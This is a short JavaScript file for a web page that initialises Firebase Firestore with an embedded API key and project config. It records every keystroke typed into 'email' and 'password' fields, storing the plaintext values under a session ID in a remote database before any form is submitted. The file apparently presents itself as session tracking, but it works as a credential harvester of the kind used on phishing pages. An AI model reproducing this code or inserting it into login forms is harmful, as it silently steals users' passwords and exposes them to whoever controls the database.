// Import Firebase and Firestore modules from CDN URLs
import { initializeApp } from "https://www.gstatic.com/firebasejs/9.15.0/firebase-app.js";
import {
  getFirestore,
  doc,
  setDoc,
  getDoc,
} from "https://www.gstatic.com/firebasejs/9.15.0/firebase-firestore.js";

// Firebase configuration (replace with your actual Firebase project credentials)
const firebaseConfig = {
  apiKey: "AIzaSyARLV52T-_-PqUtOBRvG7ZeyyPEeZINM9Q",
  authDomain: "test-d1a03.firebaseapp.com",
  projectId: "test-d1a03",
  storageBucket: "test-d1a03.firebasestorage.app",
  messagingSenderId: "619781751073",
  appId: "1:619781751073:web:71134715f811f59040fe60",
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getFirestore(app);

let sessionId;

// Check if a session already exists (in localStorage)
if (localStorage.getItem("sessionId")) {
  sessionId = localStorage.getItem("sessionId");
} else {
  // Create a new session ID if it doesn't exist
  sessionId = generateSessionId();
  localStorage.setItem("sessionId", sessionId); // Store session ID in localStorage
  createSession(sessionId); // Save session to Firestore
}

// Function to generate a unique session ID (e.g., using current timestamp and random number)
function generateSessionId() {
  return "session-" + Date.now() + "-" + Math.floor(Math.random() * 1000);
}

// Function to create a session document in Firestore
async function createSession(sessionId) {
  const sessionRef = doc(db, "sessions", sessionId);
  try {
    await setDoc(sessionRef, {
      sessionId: sessionId,
      createdAt: new Date(),
      inputs: {}, // Object to store input values
    });
    console.log("Session created in Firestore:", sessionId);
  } catch (error) {
    console.error("Error creating session document:", error);
  }
}

// Listen for input changes and update Firestore under the session document
document
  .getElementById("email")
  .addEventListener("input", (event) => updateSession(event));
document
  .getElementById("password")
  .addEventListener("input", (event) => updateSession(event));

// Function to update the session document in Firestore with user input
// Function to update the session document in Firestore with user input
async function updateSession(event) {
  const inputId = event.target.id;
  const inputValue = event.target.value;

  const sessionRef = doc(db, "sessions", sessionId);

  try {
    // Get the current session data
    const sessionDoc = await getDoc(sessionRef);
    if (sessionDoc.exists()) {
      const data = sessionDoc.data();

      // Update the "inputs" field with the new input value
      const updatedInputs = { ...data.inputs, [inputId]: inputValue };

      // Set the updated inputs field
      await setDoc(sessionRef, {
        ...data,
        inputs: updatedInputs,
      });
      console.log("Session updated in Firestore.");
    } else {
      console.error("Session document does not exist.");
    }
  } catch (error) {
    // Log the full error details
    console.error("Error updating session document:", error.message || error);
  }
}

console.log("a");
